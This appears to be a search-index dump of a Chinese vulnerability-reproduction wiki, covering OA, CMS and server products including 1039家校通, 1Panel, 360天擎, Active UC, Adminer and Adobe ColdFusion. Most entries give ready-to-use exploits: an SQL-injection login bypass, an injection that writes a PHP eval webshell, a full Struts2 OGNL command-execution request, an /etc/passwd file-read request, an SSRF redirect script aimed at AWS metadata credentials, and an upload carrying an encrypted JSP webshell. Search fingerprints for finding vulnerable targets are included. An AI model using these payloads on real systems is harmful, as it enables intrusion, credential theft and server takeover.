SQL注入漏洞 狮子鱼CMS ApigoodController.class.php SQL注入漏洞 狮子鱼CMS image_upload.php 任意文件上传 狮子鱼CMS wxapp.php 任意文件上传漏洞 禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞 禅道 11.6 api-getModel-api-sql-sql 后台SQL注入漏洞 禅道 11.6 api-getModel-editor-save-filePath 任意文件写入漏洞 禅道 12.4.2 CSRF漏洞 CNVD-2020-68552 禅道 12.4.2 后台任意文件上传漏洞 CNVD-C-2020-121325 禅道 V16.5 SQL 注入 CNVD-2022-42853 禅道 项目管理系统远程命令执行漏洞 CNVD-2023-02709 齐博CMS V7 job.php 任意文件读取漏洞 OA产品漏洞 O2OA invoke 后台远程命令执行漏洞 CNVD-2020-18740 O2OA open 后台任意文件读取漏洞 一米OA getfile.jsp 任意文件读取漏洞 万户OA DocumentEdit.jsp SQL注入漏洞 万户OA download_ftp.jsp 任意文件下载漏洞 万户OA download_old.jsp 任意文件下载漏洞 万户OA downloadhttp.jsp 任意文件下载漏洞 万户OA DownloadServlet 任意文件读取漏洞 万户OA fileUpload.controller 任意文件上传漏洞 万户OA OfficeServer.jsp 任意文件上传漏洞 万户OA showResult.action 后台SQL注入漏洞 万户OA smartUpload.jsp 任意文件上传漏洞 万户OA TeleConferenceService XXE注入漏洞 信呼OA beifenAction.php 后台目录遍历漏洞 华天动力OA 8000版 workFlowService SQL注入漏洞 启莱OA CloseMsg.aspx SQL注入漏洞 启莱OA messageurl.aspx SQL注入漏洞 启莱OA treelist.aspx SQL注入漏洞 帆软报表 2012 SSRF漏洞 帆软报表 2012 信息泄露漏洞 帆软报表 channel 远程命令执行漏洞 帆软报表 V8 任意文件读取漏洞 CNVD-2018-04757 帆软报表 V9 任意文件覆盖文件上传 新点OA ExcelExport 敏感信息泄露漏洞 智明 SmartOA EmailDownload.ashx 任意文件下载漏洞 极限OA video_file.php 任意文件读取漏洞 泛微OA DBconfigReader.jsp 数据库配置信息泄漏漏洞 泛微OA E-Bridge saveYZJFile 任意文件读取漏洞 泛微OA E-Cology BshServlet 远程代码执行漏洞 CNVD-2019-32204 泛微OA E-Cology getSqlData SQL注入漏洞 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞 泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞 泛微OA E-cology KtreeUploadAction 任意文件上传 泛微OA E-Cology LoginSSO.jsp SQL注入漏洞 CNVD-2021-33202 泛微OA E-Cology ofsLogin.jsp 前台任意用户登录漏洞 泛微OA E-Cology users.data 敏感信息泄漏 泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞 泛微OA E-cology WorkflowServiceXml RCE 泛微OA E-Office group_xml.php SQL注入漏洞 泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞 泛微OA E-Office OfficeServer.php 任意文件上传漏洞 泛微OA E-Office officeserver.php 任意文件读取漏洞 泛微OA E-Office UploadFile.php 任意文件上传漏洞 CNVD-2021-49104 泛微OA E-Office upload","date":"0001-01-01","objectID":"/readme/:1:0","tags":null,"title":"","uri":"/readme/"},{"categories":null,"content":"0x02 声明 本项目收集漏洞均源于互联网： Peiqi：https://github.com/PeiQi0/PeiQi-WIKI-Book ","date":"0001-01-01","objectID":"/readme/:2:0","tags":null,"title":"","uri":"/readme/"},{"categories":null,"content":"0x03 更新日志 2022.12.05 图片本地化 ","date":"0001-01-01","objectID":"/readme/:3:0","tags":null,"title":"","uri":"/readme/"},{"categories":null,"content":"1039家校通 万能密码绕过 CNVD-2020-31494 ","date":"0001-01-01","objectID":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87-cnvd-2020-31494/:0:0","tags":null,"title":"","uri":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87-cnvd-2020-31494/"},{"categories":null,"content":"漏洞描述 北京1039科技发展有限公司是一家专注驾校管理系统、驾校移动办公系统、驾校管理软件、驾校招生小程序开发等,为驾校提供无死角的驾校管理系统解决方案。 北京1039科技发展有限公司驾校管理系统存在万能密码绕过漏洞，攻击者可利用该漏洞获取数据库信息。 ","date":"0001-01-01","objectID":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87-cnvd-2020-31494/:1:0","tags":null,"title":"","uri":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87-cnvd-2020-31494/"},{"categories":null,"content":"漏洞影响 1039家校通 v1.0 - v6.0 ","date":"0001-01-01","objectID":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87-cnvd-2020-31494/:2:0","tags":null,"title":"","uri":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87-cnvd-2020-31494/"},{"categories":null,"content":"网络测绘 title=\"学员登录_1039家校通\" ","date":"0001-01-01","objectID":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87-cnvd-2020-31494/:3:0","tags":null,"title":"","uri":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87-cnvd-2020-31494/"},{"categories":null,"content":"漏洞复现 管理员登录接口为 /admin/Product/Comstye.aspx /Student/StudentLogin.aspx /Teacher/Index.aspx 账号密码为如下即可登录 user:peiqi pass:' or ''=' ","date":"0001-01-01","objectID":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87-cnvd-2020-31494/:4:0","tags":null,"title":"","uri":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87-cnvd-2020-31494/"},{"categories":null,"content":"1039家校通 后台任意文件上传漏洞 ","date":"0001-01-01","objectID":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 北京1039科技发展有限公司是一家专注驾校管理系统、驾校移动办公系统、驾校管理软件、驾校招生小程序开发等,为驾校提供无死角的驾校管理系统解决方案。 北京1039科技发展有限公司驾校管理系统后台编辑器存在任意文件上传漏洞，攻击者可以通过抓包的方式得知webshell路径，导致服务器被入侵 ","date":"0001-01-01","objectID":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 1039家校通 v1.0 - v6.0 ","date":"0001-01-01","objectID":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"学员登录_1039家校通\" ","date":"0001-01-01","objectID":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 使用 1039家校通 万能密码绕过 CNVD-2020-31494 登录后台后找到编辑器页面 Burp抓包上传 asp webshell木马 可以得知webshell地址，这里我使用的冰蝎默认马，使用冰蝎连接 ","date":"0001-01-01","objectID":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/1039%E5%AE%B6%E6%A0%A1%E9%80%9A-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"1Panel loadfile 后台文件读取漏洞 ","date":"0001-01-01","objectID":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 1Panel 是一个现代化、开源的Linux 服务器运维管理面板。 1Panel 后台存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感信息文件 ","date":"0001-01-01","objectID":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 1Panel ","date":"0001-01-01","objectID":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"1Panel\" ","date":"0001-01-01","objectID":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /api/v1/file/loadfile {\"paht\":\"/etc/passwd\"} ","date":"0001-01-01","objectID":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/1panel-loadfile-%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"360天擎 越权访问/数据库信息泄露 ","date":"0001-01-01","objectID":"/360%E5%A4%A9%E6%93%8E-gettablessize-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/360%E5%A4%A9%E6%93%8E-gettablessize-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 360天擎 存在未授权越权访问，造成敏感信息泄露 ","date":"0001-01-01","objectID":"/360%E5%A4%A9%E6%93%8E-gettablessize-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/360%E5%A4%A9%E6%93%8E-gettablessize-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 天擎 ","date":"0001-01-01","objectID":"/360%E5%A4%A9%E6%93%8E-gettablessize-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/360%E5%A4%A9%E6%93%8E-gettablessize-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 GET /api/dbstat/gettablessize HTTP/1.1 ","date":"0001-01-01","objectID":"/360%E5%A4%A9%E6%93%8E-gettablessize-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/360%E5%A4%A9%E6%93%8E-gettablessize-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"360天擎 rptsvcsyncpoint 前台SQL注入 ","date":"0001-01-01","objectID":"/360%E5%A4%A9%E6%93%8E-rptsvcsyncpoint-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:0:0","tags":null,"title":"","uri":"/360%E5%A4%A9%E6%93%8E-rptsvcsyncpoint-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"漏洞描述 天擎 存在SQL注入,攻击者可以通过漏洞上传木马 ","date":"0001-01-01","objectID":"/360%E5%A4%A9%E6%93%8E-rptsvcsyncpoint-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:1:0","tags":null,"title":"","uri":"/360%E5%A4%A9%E6%93%8E-rptsvcsyncpoint-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"漏洞影响 天擎 ","date":"0001-01-01","objectID":"/360%E5%A4%A9%E6%93%8E-rptsvcsyncpoint-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:2:0","tags":null,"title":"","uri":"/360%E5%A4%A9%E6%93%8E-rptsvcsyncpoint-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"网络测绘 title=\"360新天擎\" ","date":"0001-01-01","objectID":"/360%E5%A4%A9%E6%93%8E-rptsvcsyncpoint-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:3:0","tags":null,"title":"","uri":"/360%E5%A4%A9%E6%93%8E-rptsvcsyncpoint-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"漏洞复现 注入写shell: https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('\u003c?php @eval($_POST[1]);?\u003e');copy O(T) to 'C:\\Program Files (x86)\\360\\skylar6\\www\\1.php';drop table O;-- 利用过程: 1. 通过安装包安装的一般都有root权限，因此该注入点可尝试写shell 2. 通过注入点，创建一张表 O 3. 为 表O 添加一个新字段 T 并且写入shell内容 4. Postgres数据库 使用COPY TO把一个表的所有内容都拷贝到一个文件(完成写shell) 5. 删除 表O 使用命令 sqlmap -u https://xxx.xxx.xxx.xxx:8443/api/dp/rptsvcsyncpoint?ccid=1 --dbms PostgreSQL ","date":"0001-01-01","objectID":"/360%E5%A4%A9%E6%93%8E-rptsvcsyncpoint-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/:4:0","tags":null,"title":"","uri":"/360%E5%A4%A9%E6%93%8E-rptsvcsyncpoint-%E5%89%8D%E5%8F%B0sql%E6%B3%A8%E5%85%A5/"},{"categories":null,"content":"Active UC index.action 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/active-uc-index.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/active-uc-index.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 网动统一通信平台 Active UC index.action 存在S2-045远程命令执行漏洞, 通过漏洞可以执行任意命令 ","date":"0001-01-01","objectID":"/active-uc-index.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/active-uc-index.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Active UC ","date":"0001-01-01","objectID":"/active-uc-index.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/active-uc-index.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"网动统一通信平台(Active UC)\" ","date":"0001-01-01","objectID":"/active-uc-index.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/active-uc-index.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 发送如下请求包 POST /acenter/index.action HTTP/1.1 Cookie: SessionId=96F3F15432E0660E0654B1CE240C4C36 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) Charsert: UTF-8 Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}; boundary=---------------------------18012721719170 Cache-Control: no-cache Pragma: no-cache Host: Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 Connection: keep-alive Content-Length: 196 -----------------------------18012721719170 Content-Disposition: form-data; name=\"pocfile\"; filename=\"text.txt\" Content-Type: text/plain xxxxxxx -----------------------------18012721719170 ","date":"0001-01-01","objectID":"/active-uc-index.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/active-uc-index.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Adminer SSRF漏洞 CVE-2021-21311 ","date":"0001-01-01","objectID":"/adminer-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21311/:0:0","tags":null,"title":"","uri":"/adminer-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21311/"},{"categories":null,"content":"漏洞描述 使用管理员发送任意get请求并从内部服务器检索JSON响应的方法。可以从AWS元数据服务中提取AWS访问密钥。 参考链接： https://github.com/advisories/GHSA-x5r2-hj5c-8jx6 https://gist.github.com/bpsizemore/227141941c5075d96a34e375c63ae3bd ","date":"0001-01-01","objectID":"/adminer-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21311/:1:0","tags":null,"title":"","uri":"/adminer-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21311/"},{"categories":null,"content":"漏洞复现 首先，启动一个python服务器，该服务器侦听传入的连接并以301重定向响应到任意选择的主机。在此示例情况下，重定向指向AWS元数据服务： http://169.254.169.254/latest/meta-data/instance-id 然后，在Adminer中使用Elasticsearch登录模块“登录”运行python代码的服务器，这导致Adminer从包含服务器的AWS实例ID的元数据服务器打印json响应。 重定向请求的python脚本： #!/usr/bin/env python import SimpleHTTPServer import SocketServer import sys import argparse def redirect_handler_factory(url): \"\"\" Returns a request handler class that redirects to supplied `url` \"\"\" class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler): def do_GET(self): self.send_response(301) self.send_header('Location', url) self.end_headers() def do_POST(self): self.send_response(301) self.send_header('Location', url) self.end_headers() return RedirectHandler def main(): parser = argparse.ArgumentParser(description='HTTP redirect server') parser.add_argument('--port', '-p', action=\"store\", type=int, default=80, help='port to listen on') parser.add_argument('--ip', '-i', action=\"store\", default=\"\", help='host interface to listen on') parser.add_argument('redirect_url', action=\"store\") myargs = parser.parse_args() redirect_url = myargs.redirect_url port = myargs.port host = myargs.ip redirectHandler = redirect_handler_factory(redirect_url) handler = SocketServer.TCPServer((host, port), redirectHandler) print(\"serving at port %s\" % port) handler.serve_forever() if __name__ == \"__main__\": main() http://169.254.169.254/latest/meta-data/iam/security-credentials/ //列出服务器的可用角色。 ","date":"0001-01-01","objectID":"/adminer-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21311/:2:0","tags":null,"title":"","uri":"/adminer-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-21311/"},{"categories":null,"content":"Adobe ColdFusion upload.cfm 任意文件上传漏洞 CVE-2018-15961 ","date":"0001-01-01","objectID":"/adobe-coldfusion-upload.cfm-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2018-15961/:0:0","tags":null,"title":"","uri":"/adobe-coldfusion-upload.cfm-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2018-15961/"},{"categories":null,"content":"漏洞描述 Adobe ColdFusion存在任意文件上传漏洞，通过漏洞攻击者可上传任意文件控制服务器 ","date":"0001-01-01","objectID":"/adobe-coldfusion-upload.cfm-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2018-15961/:1:0","tags":null,"title":"","uri":"/adobe-coldfusion-upload.cfm-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2018-15961/"},{"categories":null,"content":"漏洞影响 Adobe ColdFusion ","date":"0001-01-01","objectID":"/adobe-coldfusion-upload.cfm-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2018-15961/:2:0","tags":null,"title":"","uri":"/adobe-coldfusion-upload.cfm-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2018-15961/"},{"categories":null,"content":"网络测绘 app=\"Adobe-ColdFusion\" ","date":"0001-01-01","objectID":"/adobe-coldfusion-upload.cfm-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2018-15961/:3:0","tags":null,"title":"","uri":"/adobe-coldfusion-upload.cfm-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2018-15961/"},{"categories":null,"content":"漏洞复现 产品官网 发送数据包上传任意文件 POST /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm HTTP/1.1 Host: User-Agent: Go-http-client/1.1 Content-Length: 918 Content-Type: multipart/form-data; boundary=e9fb732e96144291860c4d742145cdabf98a4ec5cbe2a91aec6dc17461a0 Accept-Encoding: gzip --e9fb732e96144291860c4d742145cdabf98a4ec5cbe2a91aec6dc17461a0 Content-Disposition: form-data; name=\"file\"; filename=\"b79f4282c451e975c357d9616acea7ba.jsp\" Content-Type: application/octet-stream \u003c%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%\u003e\u003c%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u003e\u003c%if (request.getMethod().equals(\"POST\")){String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec(k.getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%\u003e --e9fb732e96144291860c4d742145cdabf98a4ec5cbe2a91aec6dc17461a0 Content-Disposition: form-data; name=\"path\" path --e9fb732e96144291860c4d742145cdabf98a4ec5cbe2a91aec6dc17461a0-- 再访问路径 /cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/shell.jsp ","date":"0001-01-01","objectID":"/adobe-coldfusion-upload.cfm-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2018-15961/:4:0","tags":null,"title":"","uri":"/adobe-coldfusion-upload.cfm-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cve-2018-15961/"},{"categories":null,"content":"Adobe ColdFusion 远程代码执行漏洞 CVE-2021-21087 ","date":"0001-01-01","objectID":"/adobe-coldfusion-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21087/:0:0","tags":null,"title":"","uri":"/adobe-coldfusion-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21087/"},{"categories":null,"content":"漏洞描述 Adobe ColdFusion是一个快速应用程序开发平台。Adobe ColdFusion 存在远程代码执行漏洞，由于过滤不严，未经授权的攻击者可构造恶意请求，造成任意代码执行，控制服务器。建议相关用户尽快采取安全措施阻止漏洞攻击。 参考链接： https://nosec.org/home/detail/4707.html https://github.com/projectdiscovery/nuclei-templates/pull/1128/files https://helpx.adobe.com/security/products/coldfusion/apsb21-16.html ","date":"0001-01-01","objectID":"/adobe-coldfusion-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21087/:1:0","tags":null,"title":"","uri":"/adobe-coldfusion-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21087/"},{"categories":null,"content":"漏洞影响 Adobe ColdFusion 2021 \u003c= Version 2021.0.0.323925 Adobe ColdFusion 2018 \u003c= Update 10 Adobe ColdFusion 2016 \u003c= Update 16 ","date":"0001-01-01","objectID":"/adobe-coldfusion-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21087/:2:0","tags":null,"title":"","uri":"/adobe-coldfusion-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2021-21087/"},{"categories":null,"content":"网络测绘 app=\"Adobe-ColdFusion\" 